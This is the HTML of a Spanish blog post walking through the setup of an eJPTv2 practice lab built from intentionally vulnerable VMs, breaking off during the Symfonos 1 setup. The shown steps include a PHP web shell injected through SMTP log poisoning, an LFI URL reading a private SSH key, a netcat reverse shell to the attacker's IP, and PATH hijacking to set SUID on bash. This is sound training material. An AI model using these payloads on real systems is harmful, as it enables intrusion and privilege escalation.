@@ -1,0 +1,1826 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Sergiky">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://sergiky.github.io/2025/03/25/lab-ejptv2-xerosec/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Bueno bueno bueeeeeenoooo, bienvenidos a todos, hoy vamos a crear y resolver el laboratorio creado por XeroSec en el que pone en práctica diferentes técnicas y herramientas recomendadas para la certif">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Laboratorio preparatorio ejptv2 | Xerosec">
+<meta property="og:url" content="https://sergiky.github.io/2025/03/25/lab-ejptv2-xerosec/index.html">
+<meta property="og:site_name" content="Sergiky">
+<meta property="og:description" content="Bueno bueno bueeeeeenoooo, bienvenidos a todos, hoy vamos a crear y resolver el laboratorio creado por XeroSec en el que pone en práctica diferentes técnicas y herramientas recomendadas para la certif">
+<meta property="og:locale" content="es_ES">
+<meta property="og:image" content="https://sergiky.github.io/images/sergiky.webp">
+<meta property="article:published_time" content="2025-03-24T23:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-03T10:49:57.716Z">
+<meta property="article:author" content="Sergio Guijarro">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="pivoting">
+<meta property="article:tag" content="movimiento-lateral">
+<meta property="article:tag" content="eJPT">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="id-rsa-cracking">
+<meta property="article:tag" content="path-hijacking">
+<meta property="article:tag" content="smb">
+<meta property="article:tag" content="wordpress">
+<meta property="article:tag" content="lfi">
+<meta property="article:tag" content="nmap">
+<meta property="article:tag" content="fping">
+<meta property="article:tag" content="arp-scan">
+<meta property="article:tag" content="netdiscover">
+<meta property="article:tag" content="dirb">
+<meta property="article:tag" content="dirbuster">
+<meta property="article:tag" content="smbclient">
+<meta property="article:tag" content="smbmap">
+<meta property="article:tag" content="crackmapexec">
+<meta property="article:tag" content="netexec">
+<meta property="article:tag" content="enum4linux">
+<meta property="article:tag" content="wpscan">
+<meta property="article:tag" content="searchsploit">
+<meta property="article:tag" content="john">
+<meta property="article:tag" content="ssh2john">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sergiky.github.io/images/sergiky.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/letter-s-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/letter-s-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/letter-s-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Laboratorio preparatorio ejptv2 | Xerosec | Sergiky
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"sergiky.github.io","root":"/","language":"es","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"20px","line_height":1.5,"image_border_radius":"20px","image_alignment":"center","image_caption":true,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":false,"count":false,"min2read":false},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":true,"title":"Artículos recomendados","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1400px","sidebar_width":"300px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/sergiky.webp","description":null},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/black.gif","dark":"/images/black.gif"},"title":"<div class=\"social-contacts px-6 py-3 bg-gray-300/50 dark:bg-gray-500/40 backdrop-blur-lg border border-white/20 dark:border-gray-500/30 shadow-redefine-flat rounded-3xl flex flex-row gap-3 items-center\"> <span>✧Sergiky World✧</span> </div>","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/sergiky"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"CTF":{"path":"/categories/ctf","icon":"fa-regular fa-archive","submenus":{"Labs":"/categories/ctf/labs","TryHackMe":"/categories/ctf/tryhackme"}},"Whoami":{"icon":"fa-regular fa-user","path":"/whoami"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":false,"position":"right","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"YYYY-MM-DD","excerpt_length":200,"categories":{"enable":false,"limit":3},"tags":{"enable":true,"limit":3}}};
+    window.lang_ago = {"second":"Hace %s segundos","minute":"Hace %s minutos","hour":"Hace %s horas","day":"Hace %s días","week":"Hace %s semanas","month":"Hace %s meses","year":"Hace %s años"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Sergiky
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    CTF
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/categories/ctf/labs">
+                                                    LABS
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/categories/ctf/tryhackme">
+                                                    TRYHACKME
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/whoami"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    WHOAMI
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-CTF"
+                        >
+                            <span>
+                                CTF
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-CTF">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/categories/ctf/labs">LABS</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/categories/ctf/tryhackme">TRYHACKME</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/whoami"
+                        >
+                            <span>
+                                WHOAMI
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">49</div>
+        <div class="label text-third-text-color text-sm">Etiquetas</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">Categorías</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">Publicaciones</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="/2025/03/25/lab-ejptv2-xerosec/cover-image.png" alt="Laboratorio preparatorio ejptv2 | Xerosec" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">Laboratorio preparatorio ejptv2 | Xerosec</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/letter-s-favicon.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Sergiky</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-25</span>
+        <span class="mobile">2025-03-25</span>
+        <span class="hover-info">Creado</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-04-03 12:49:57</span>
+            <span class="mobile">2025-04-03 12:49:57</span>
+            <span class="hover-info">Actualizado</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/ctf/">ctf</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/ctf/labs/">labs</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/vulnhub/">vulnhub</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/linux/">linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/windows/">windows</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/pivoting/">pivoting</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/movimiento-lateral/">movimiento-lateral</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/eJPT/">eJPT</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/easy/">easy</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/id-rsa-cracking/">id-rsa-cracking</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/path-hijacking/">path-hijacking</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/smb/">smb</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/wordpress/">wordpress</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/lfi/">lfi</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/nmap/">nmap</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/fping/">fping</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/arp-scan/">arp-scan</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/netdiscover/">netdiscover</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/dirb/">dirb</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/dirbuster/">dirbuster</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/smbclient/">smbclient</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/smbmap/">smbmap</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/crackmapexec/">crackmapexec</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/netexec/">netexec</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/enum4linux/">enum4linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/wpscan/">wpscan</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/searchsploit/">searchsploit</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/john/">john</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ssh2john/">ssh2john</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>Bueno bueno bueeeeeenoooo, bienvenidos a todos, hoy vamos a crear y resolver el laboratorio creado por <strong><a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/@xerosec" >XeroSec<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> en el que pone en práctica diferentes técnicas y herramientas recomendadas para la certificación eJPTv2, al lío.</p>
+<h1 id="Creacion-del-laboratorio"><a href="#Creacion-del-laboratorio" class="headerlink" title="Creación del laboratorio"></a>Creación del laboratorio</h1><h2 id="Recursos-necesarios"><a href="#Recursos-necesarios" class="headerlink" title="Recursos necesarios"></a>Recursos necesarios</h2><p>Bien os dejo por aquí las máquinas que vamos a utilizar para nuestro laboratorio en <strong>VirtualBox</strong>:</p>
+<ul>
+<li><p><strong><a class="link"   target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/symfonos-1,322/" >Symfonos I<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong>. Si habéis mirando un poco mi super página increible de la muerte podréis observar que ya utilizamos está máquina previamente <a href="https://sergiky.github.io/2024/12/04/Symfonos%201%20y%202/">Symfonos 1 y 2</a>, pero en esta ocasión vamos a enfocarlo de otra manera en lugar de seguir el procedimiento de explotación con el que fue ideado(cómo lo realizamos en el artículo mencionado).</p>
+</li>
+<li><p><strong><a class="link"   target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm=Doc" >Doc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong>. Máquina Linux de la plataforma <a class="link"   target="_blank" rel="noopener" href="https://hackmyvm.eu/" >hackmyvm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. En esta plataforma se necesita inicar sesión.</p>
+</li>
+<li><p><strong><a class="link"   target="_blank" rel="noopener" href="https://vulnyx.com/#experience" >Experience<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong>: Máquina Windows de la plataforma <a class="link"   target="_blank" rel="noopener" href="https://vulnyx.com/" >Vulnyx<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</li>
+<li><p><strong><a class="link"   target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/?v=simple" >Simple<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong>. Máquina Windows de la plataforma <a class="link"   target="_blank" rel="noopener" href="https://hackmyvm.eu/" >hackmyvm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
+</li>
+<li><p><strong><a class="link"   target="_blank" rel="noopener" href="https://vulnyx.com/#blog" >Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong>: Máquina Linux de <a class="link"   target="_blank" rel="noopener" href="https://vulnyx.com/" >Vulnyx<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
+</li>
+<li><p><strong><a class="link"   target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/?v=gift" >Gift<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong>: Máquina Linux de <a class="link"   target="_blank" rel="noopener" href="https://hackmyvm.eu/" >hackmyvm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
+</li>
+<li><p><strong>Kali Linux</strong>. No menos importante. En el examen del ejptv2 nos darán una máquina kali a través de Guacamole(por navegador web) <strong>sin acceso a internet</strong> esto significa que tenemos que utilizar las herramientas preinstaladas del sistema o las que nos dejan preparadas.</p>
+</li>
+</ul>
+<h2 id="Configuracion-de-los-adaptadores-de-red"><a href="#Configuracion-de-los-adaptadores-de-red" class="headerlink" title="Configuración de los adaptadores de red"></a>Configuración de los adaptadores de red</h2><p>Importamos todas las máquinas a VirtualBox.<br>La configuración sería la siguiente:</p>
+<p>En el administrador de red vamos a crear dos redes NAT(red externa y interna) las podéis llamar como queráis:</p>
+<ul>
+<li>La red externa tendrá el prefijo 10.0.2.0&#x2F;24(Por defecto)</li>
+<li>La red interna tendrá el prefijo 192.168.100.0&#x2F;24</li>
+</ul>
+<p>A continuación mencionaré los adaptadores que tendrán cada máquina:</p>
+<ul>
+<li>Symfonos 1: Red NAT externa.</li>
+<li>Doc: Red NAT externa.</li>
+<li>Experience: Red NAT externa.</li>
+<li>Simple: Red NAT externa.</li>
+<li>Blog: Red NAT externa y en el segundo adaptador la red NAT interna.</li>
+<li>Gift: Red NAT <strong>interna</strong>.</li>
+</ul>
+<p>¿Porque hemos creado una red NAT interna en lugar de una red interna propia de virtualbox?<br>Porque virtualbox ofrece el servicio de DHCP automático para estas redes y así nos ahorramos configurar la IP manualmente.</p>
+<h2 id="Configuracion-extra-maquinas"><a href="#Configuracion-extra-maquinas" class="headerlink" title="Configuración extra máquinas"></a>Configuración extra máquinas</h2><h3 id="Maquina-Symfonos-1"><a href="#Maquina-Symfonos-1" class="headerlink" title="Máquina Symfonos 1"></a>Máquina Symfonos 1</h3><p>La idea es crear una clave privada(id_rsa) para que se pueda leer desde un local file inclusion para que sea más sencilla la intrusión.</p>
+<p>Recomiendo ser generoso con la RAM de la máquina Symfonos porque el servicio de smtp en mi caso no funcionaba bien.</p>
+<p>He utilizado el vector de entrada original que utilizamos en la máquina Symfonos 1 para poder acceder al sistema, no voy a explicarlo a fondo porque está ya explicado en la entrada comentada. Los comandos a seguir serían los siguientes:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Comprobamos que accediendo a la siguiente ruta podemos ver los logs(Utilizar vuestra ip):</span></span><br><span class="line">http://10.0.2.6/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nos conectamos a la máquina por el puerto 25</span></span><br><span class="line">telnet 10.0.2.5 25</span><br><span class="line"></span><br><span class="line"><span class="comment"># Podemos comprobar si no require autenticación y podemos enviar directamente un correo:</span></span><br><span class="line"></span><br><span class="line">MAIL FROM: sergiky</span><br><span class="line">RCPT TO: helios</span><br><span class="line">DATA</span><br><span class="line">&lt;?php system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt;</span><br><span class="line">.</span><br><span class="line">QUIT</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Nos ponemos en escucha desde nuestro equipo(en otra consola):</span></span><br><span class="line"><span class="built_in">sudo</span> nc -nlvp 443</span><br><span class="line"></span><br><span class="line"><span class="comment"># Comando para mandar la shell desde la víctima a nuestro equipo</span></span><br><span class="line"><span class="comment"># La máquina víctima tiene la 2.6 y mi máquina kali tiene la 2.4</span></span><br><span class="line">curl -s -X GET <span class="string">&#x27;http://10.0.2.6/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=nc+-e+/bin/bash+10.0.2.4+443&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Para el tratamiento de la tty:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br><span class="line"><span class="comment"># ctrl_z</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset xterm</span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure></div>
+
+<p>Vamos a crear la clave cifrada de tal manera que la podamos crackear con john the ripper más adelante:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/helios/</span><br><span class="line"><span class="built_in">mkdir</span> .ssh</span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line">ssh-keygen -t rsa -b 2048 -m PEM -f id_rsa</span><br><span class="line"><span class="built_in">cat</span> id_rsa.pub &gt; authorized_keys</span><br></pre></td></tr></table></figure></div>
+<p>La clave será <strong>123123</strong>(aparece en el rockyou)</p>
+<p>Podeis comprobar que tenéis acceso a la clave aprovechándonos del LFI que explotaremos más adelante:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.6/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/helios/.ssh/id_rsa</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/symfonos1_id_rsa_creada.png"
+                      alt="Creación de la id_rsa."
+                ><figcaption>Creación de la id_rsa.</figcaption></figure></p>
+<p>Después tendremos que deshabilitar el inicio de sesión con contraseña y habilitar el inicio de sesión con clave. Para ello debemos de retocar el fichero de configuración de ssh, pero para ello tendremos que tener privilegios, así que realicemos la escalada:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/helios</span><br><span class="line"><span class="built_in">touch</span> curl</span><br><span class="line"><span class="built_in">chmod</span> +x curl</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dentro del archivo curl</span></span><br><span class="line"><span class="built_in">chmod</span> u+s /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Cerramos el archivo curl</span></span><br><span class="line"><span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ejecutamos el binario </span></span><br><span class="line">/opt/statuscheck</span><br><span class="line">bash -p</span><br></pre></td></tr></table></figure></div>
+
+<p>Ahora si podemos modificar el fichero de ssh: <strong>&#x2F;etc&#x2F;ssh&#x2F;sshd_config</strong>.<br>Tenemos que descomentar y dejar así las siguientes líneas:</p>
+<ul>
+<li>PasswordAuthentication no</li>
+<li>PubkeyAuthentication yes</li>
+<li>AuthorizedKeysFile      .ssh&#x2F;authorized_keys</li>
+</ul>
+<p>Reiniciamos el servicio de ssh:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ssh restart</span><br></pre></td></tr></table></figure></div>
+
+<p>Una vez realizado toda la parte del servidor nos vamos a nuestro equipo atacante.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
